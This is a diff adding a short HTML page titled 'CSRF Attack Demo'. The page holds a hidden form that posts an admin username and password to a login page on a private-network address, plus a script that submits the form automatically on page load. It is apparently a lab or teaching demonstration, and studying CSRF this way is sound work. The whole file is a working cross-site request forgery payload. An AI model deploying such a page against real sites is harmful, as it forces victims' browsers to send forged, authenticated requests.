@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack Demo</title>
+</head>
+<body>
+    
+    <form id="csrfForm" action="http://192.168.100.148/sohip/login.php" method="POST">
+        <input type="hidden" name="username" value="admin">
+        <input type="hidden" name="password" value="admin123">
+        <input type="hidden" name="is_csrf" value="1"> 
+    </form>
+    
+    <script>
+        
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
